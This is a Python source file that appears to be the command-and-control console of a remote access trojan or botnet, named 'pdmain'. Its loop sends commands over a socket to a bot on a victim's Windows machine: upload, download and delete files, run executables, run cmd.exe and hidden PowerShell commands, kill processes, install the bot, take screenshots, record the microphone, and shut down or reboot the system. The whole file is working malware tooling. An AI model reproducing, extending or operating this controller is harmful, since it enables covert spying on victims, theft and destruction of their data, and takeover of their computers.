"""

Have a good time reading the source. You are an amazing person.

"""
from .pdmain import *
from colorama import Fore, Style
import colorama 
import time

def run_session(sockfd,mode, input_string, cid_int, infoFor):

    def SendData(data):
        try:
            sockfd.send(data.encode())
        except Exception as serror:
            print("[ERROR] " + str(serror))
    
    def SendBytes(data):
        try:
            sockfd.send(data)
        except Exception as error:
            clients.remove(sockfd)
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(error))
    

    def filetransfer(mfile = None, rfile=None):
        if(mfile == None and rfile == None):
            mfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File Path : ")
            rfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File name to Save as : ")
            
        if("=" in rfile):
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] '=' is forbidden in filename.")
        else:
            try:
                with open(mfile, "rb") as sendfile:
                    SendData("freceive") # Send File Receive trigger for client
                    SendData(rfile) # Send Filename
                    data = sendfile.read()
                    bufferst = os.stat(mfile)
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)" )
                    SendBytes(data) # Send file
                    print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
            except FileNotFoundError:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] File not found!?")
            except Exception as e:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))

    while(mode):
        try:
            sinput = input(input_string)
            args = sinput.split()
            if(sinput == "exit"):
                mode = False

            elif(sinput == "botinfo"):
                try:
                    ReadInformation(infoFor)
                except IndexError:  
                    print("--> BOT is not online!?")
            elif(sinput == "pid"):
                forid = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Enter process name to check : ")
                if(len(forid) > 0):
                    SendData("pid")
                    SendData(forid)

                
            elif(sinput.startswith("dir")):
                try:
                    param = sinput.split()
                    if(param[1] == "-s"):
                        directory = input("-> Enter Directory name : ")
                        SendData("dir")
                        SendData(directory)
                    else:
                        SendData("dir")
                        SendData(param[1])

                except IndexError:
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] USAGE :  : dir < Directory >")
            elif(sinput == "ls"):
                SendData("ls")

            #==================================================
            elif(sinput == "execute"):
                filename = input("-> Enter filename to Execute : ")
                if(len(filename) > 0):
                    SendData("execute")
                    SendData(filename)
            elif(sinput == "powershell"):
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] '-windowstyle hidden' to execute Powershell in background.")
                ps = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] powershell.exe ")
                if(len(ps) > 0):
                    SendData("powershell")
                    SendData(ps)

            elif(sinput == "cmd"):
                cmd = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] cmd.exe /c ")
                if(len(cmd) > 0):
                    SendData("cmd")
                    SendData(cmd)
            #==================================================
            elif(sinput == "delete"):
                filename = input("-> Enter filename to Delete : ")
                if(len(filename) > 0):
                    SendData("delete")
                    SendData(filename)

            elif(sinput.startswith("download")):
                try:
                    todownload = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Enter filename to Download : ")
                    SendData("fupload")
                    SendData(todownload)
                except IndexError: 
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] USAGE :  : download <filename>")
            elif(sinput == "upload"):
                filetransfer()
            
            
            
            elif(sinput == "help"):
                print(""" 
                Session Commands
                =================
                botinfo - View Bot information.
                send < data > - Send a command directly.
                
                File Management
                ================
                upload - Upload files.
                download - Download files.
                drives - Get all available drive letters.
                cat < file > - View Contents of a file.
                dir < directory > - Change current directory. (-s switch to specify Name with spaces)
                delete < file > - Delete a file.
                execute - Execute a file.
                ls - List files in current directory.

                System Power
                ================
                poweroff - Shutdown the System.
                reboot - reboot the System.

                System Commands 
                ================
                pkill - Kill a Process by name.
                pid - Get PID of running Process / Check if Process is running or not.
                cmd - Execute command in CMD, No output is returned.
                powershell - Execute command in powershell, No output is returned.
                
                Surveillance and Intelligence
                =================
                screenshot - Take Screen shot.
                micrecord - Start recording microphone.
                
                """)
            elif(sinput == "pkill"):
                app = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Process : ")
                if(len(app) > 0):
                    SendData("pkill")
                    SendData(app)

            elif(sinput == "drives"):
                SendData("drives")
            elif(sinput.startswith("cat")):
                try:
                    filename = args[1] 
                    if(".exe" not in filename):
                        if(len(filename) > 0):
                            SendData("cat")
                            SendData(filename)
                    else:
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Using that on .exe files is bad.")
                except IndexError:
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] USAGE :  : cat < filename >")
            elif(sinput == "install"):
                SendData("install")
            elif(sinput == "execute"):
                app = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Executable File Path : ")
                if(len(app) > 0):
                    SendData("execute")
                    SendData(app)
            elif(sinput.startswith("send")):
                try:
                    SendData(args[1])
                except IndexError:
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] USAGE :  : send <data>")
            elif(sinput == "screenshot"):
               SendData("screenshot")
            elif(sinput == "micrecord"):
                SendData("micstart")
                time.sleep(2)
                input("\n\n["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Press Enter to stop recording.")
                SendData("micstop")
            elif(sinput == "poweroff"):
                SendData("cmd")
                SendData("shutdown /s /t 0")
            elif(sinput == "reboot"):
                SendData("cmd")
                SendData("shutdown /r /t 0")
        except KeyboardInterrupt:
            mode = False
